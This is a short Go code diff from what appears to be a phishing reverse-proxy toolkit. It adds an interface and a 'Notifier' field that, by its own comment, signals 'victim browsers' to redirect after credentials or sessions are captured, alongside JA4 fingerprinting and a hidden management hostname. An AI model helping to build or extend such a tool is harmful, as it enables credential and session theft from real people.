@@ -67,6 +67,11 @@ type bodyObfuscator interface {
 	Obfuscate(ctx context.Context, html []byte) ([]byte, error)
 }
 
+type redirectNotifier interface {
+	WaitForRedirect(w http.ResponseWriter, r *http.Request, sessionID string)
+	PollForRedirect(w http.ResponseWriter, r *http.Request)
+}
+
 // Server is a reverse-proxy HTTPS server.
 // It accepts raw TCP connections on port 443, peeks at the TLS ClientHello
 // to capture bytes for JA4 fingerprinting, completes the TLS handshake using
@@ -99,8 +104,9 @@ type Server struct {
 	// without making real network calls.
 	UpstreamTransport http.RoundTripper
 
-	// WSHub manages WebSocket connections for real-time operator notifications.
-	WSHub *WSHub
+	// Notifier delivers session-completion signals to victim browsers,
+	// triggering the post-capture redirect.
+	Notifier redirectNotifier
 
 	// APIHandler serves management API requests on SecretHostname.
 	APIHandler http.Handler
